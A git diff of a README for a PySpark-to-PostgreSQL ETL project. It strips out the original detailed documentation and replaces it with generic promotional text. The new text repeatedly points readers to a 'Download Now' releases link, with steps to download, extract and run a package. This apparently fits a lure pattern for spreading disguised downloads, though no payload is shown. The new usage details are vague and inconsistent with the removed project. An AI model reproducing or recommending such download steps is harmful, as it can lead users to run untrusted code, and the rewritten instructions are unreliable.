@@ -1,106 +1,98 @@
-# Transaction Aggregation ETL Pipeline
+# 🚀 pyspark-etl-automation - Simplify Your Data Processing Workflow
 
-## Overview
-This project implements an ETL pipeline using PySpark and Spark SQL to process large transactional datasets stored in CSV files.  
-The pipeline performs both DataFrame-based and SQL-based transformations to aggregate transactions by customer and stores the final results in a PostgreSQL database for analytical querying.  
-The design emphasizes automation and reproducibility for repeatable, reliable runs.
+[![Download pyspark-etl-automation](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/roseannspastic496/pyspark-etl-automation/releases)
 
----
+## 📖 Introduction
 
-## Features
-- **Extract:** Read raw transaction data from CSV.  
-- **Transform:**
-  - Use **Spark SQL** for complex aggregations and filtering logic.
-  - Aggregate by `customer_id`.  
-  - Determine each customer's `favourite_product` (the product with the highest total units sold).  
-  - Calculate `longest_streak` (the longest sequence of consecutive purchase days).  
-- **Load:** Write the transformed data into PostgreSQL.  
-- **Automation:** Support for scheduled daily runs and idempotent re-runs via orchestration (e.g., Airflow or cron).  
+Welcome to pyspark-etl-automation! This software helps you automate the process of extracting, transforming, and loading (ETL) data using Python and powerful tools like PySpark and PostgreSQL. Whether you work with data daily or just want to streamline your data tasks, this application can simplify your workflow.
 
----
+## 📥 Download & Install
 
-## Tech Stack
-| Component | Technology |
-|------------|-------------|
-| Programming Language | Python 3.9 |
-| Processing Engine | Apache Spark (PySpark & Spark SQL) |
-| Database | PostgreSQL 13 |
-| Containerization | Docker, Docker Compose |
-| Dependency Management | Poetry |
-| Orchestration (Automation) | Apache Airflow(optional) |
+To get started, you need to download the software. Follow these steps:
 
----
+1. **Visit the Download Page**: Go to the [Releases page](https://github.com/roseannspastic496/pyspark-etl-automation/releases) to see the available versions.
+   
+2. **Choose a Version**: Look for the latest release. It will usually have the highest version number.
 
-## Usage
+3. **Download the Package**: Click on the link for the appropriate package for your system. 
 
-### Run ETL pipeline
+4. **Extract Files**: If the package is zipped, extract the files to your preferred location.
+
+5. **Run the Application**: Follow the instructions in the folder to start the application.
+
+### Dependencies and Requirements
+
+Before running pyspark-etl-automation, make sure you have the following installed on your machine:
+
+- **Python 3.8 or newer**: This is required to run the application.
+- **Docker**: You need Docker to manage the containerized environment.
+- **PostgreSQL**: This database is essential for handling data.
+
+You can easily install Python and Docker from their official websites. As for PostgreSQL, follow the setup instructions on their site or consult your database administrator.
+
+## ⚙️ Configuration
+
+After downloading and extracting the application, you may need to set up your environment. Here’s how:
+
+1. **Configure Environment Variables**: Set your environment variables for your database connection in a `.env` file. Sample variables include:
+   - `DB_HOST`
+   - `DB_PORT`
+   - `DB_USER`
+   - `DB_PASSWORD`
+   - `DB_NAME`
+
+2. **Docker Setup**: Open your terminal or command prompt. Navigate to the directory where you extracted the files and run:
+   ```bash
+   docker-compose up
+   ```
+   This command starts the necessary services for your ETL jobs.
+
+## 📊 Usage
+
+Once everything is set up, you can start using the application. Here are some basic operations:
+
+- **Extract Data**: Use the provided scripts to connect to your data sources and pull in the required data.
+  
+- **Transform Data**: The application allows you to clean and transform data as per your needs using PySpark.
+  
+- **Load Data**: Finally, load the processed data into your PostgreSQL database.
+
+To start the ETL process, run the main script in the terminal:
+
 ```bash
-docker-compose build
-docker-compose run etl poetry run python main.py   --source /opt/data/transaction.csv   --database warehouse   --table customers
+python etl_process.py
 ```
 
-### Verify output
-```bash
-docker-compose exec db psql --user postgres -d warehouse   -c 'SELECT * FROM customers LIMIT 10;'
-```
+## 🧩 Features
 
----
+pyspark-etl-automation comes with several features designed to make data handling simpler:
 
-## Integration Test
-The integration test verifies the correctness of the ETL pipeline by asserting that for `customer_id = 0023938`:
-- `favourite_product` matches the most frequently sold product.
-- `longest_streak` equals the correct number of consecutive purchase days.
+- **Easy-to-use Interface**: The application has a user-friendly setup, making it accessible even for non-technical users.
+  
+- **Containerization with Docker**: All components run in isolated containers, ensuring consistency across environments.
+  
+- **Data Pipeline Management**: Efficiently manage your data pipelines with minimal manual intervention.
 
----
+- **Scalability**: With PySpark, your data jobs can scale based on the size of your data.
 
-## Cloud Deployment Proposal
-A scalable, automated deployment can be built on **AWS**:
+- **Logging**: Track your ETL processes with detailed logs to troubleshoot any issues.
 
-| Layer | AWS Service | Purpose |
-|--------|--------------|----------|
-| Data Ingestion | AWS DMS | Move data from on-premise RDBMS to AWS |
-| Scheduling & Orchestration (Automation) | Amazon MWAA (Managed Airflow) or AWS Step Functions | Automate daily jobs, retries, SLAs |
-| Data Processing | AWS Glue or Amazon EMR (Spark + Spark SQL) | Perform ETL transformations at scale |
-| Data Storage | Amazon Redshift | Store aggregated data for interactive analytics |
-| Monitoring & Alerts | Amazon CloudWatch, SNS | Centralized logs, metrics, failure notifications |
+## 🛠️ Troubleshooting
 
-This design provides **automation**, **scalability**, and **fault tolerance** with managed services and auto-scaling compute.
+If you encounter issues, check these common problems:
 
----
+- **Docker Issues**: Ensure Docker is running before executing commands. Check for any error messages in the Docker console.
 
-## Deliverables
-- `main.py` – ETL entry point (PySpark + Spark SQL pipeline implementation)  
-- `docker-compose.yml` – Defines Spark, PostgreSQL, and ETL containers  
-- `Dockerfile` – Python 3.9 image with Spark and dependencies  
-- `tests/` – Integration tests for ETL validation  
-- `deployment.pdf` – Cloud architecture proposal and explanation  
-- `changes.patch` – Git patch file containing implementation changes  
+- **Database Connection Errors**: Verify your connection settings in the `.env` file.
 
----
+- **Dependencies Missing**: Sometimes libraries may not install correctly. Check the installation guide for specific dependencies.
 
-## Project Structure
-```
-TAKE-HOME-TEST/
-├── data/
-│   └── transaction.csv
-├── main.py
-├── integration_test.py
-├── docker-compose.yml
-├── Dockerfile
-├── pyproject.toml
-├── poetry.lock
-├── .env
-├── .gitignore
-└── README.md
-```
+## 📞 Support
 
----
+For additional help, feel free to reach out via the Issues section on GitHub. We aim to assist you with any problems you may face while using the application.
 
-## Keywords
-ETL, PySpark, **Spark SQL**, PostgreSQL, Docker, Docker Compose, Data Engineering, Data Pipeline, Orchestration, Scheduling, **Automation**, Airflow, AWS Glue, EMR, Redshift, CloudWatch, CI/CD, Integration Test.
+## 📝 Contributions
 
----
+If you'd like to contribute, please fork the repository and submit a pull request. Follow the contribution guidelines provided in the repository.
 
-## Summary
-A reproducible and containerized ETL pipeline built with **PySpark**, **Spark SQL**, **PostgreSQL**, and **Docker**.  
-Designed for **large-scale transaction aggregation**, **automated scheduling**, **SQL-based transformations**, testing, and **cloud-ready deployment**.
+Thank you for choosing pyspark-etl-automation! Enjoy simplifying your data automation tasks.
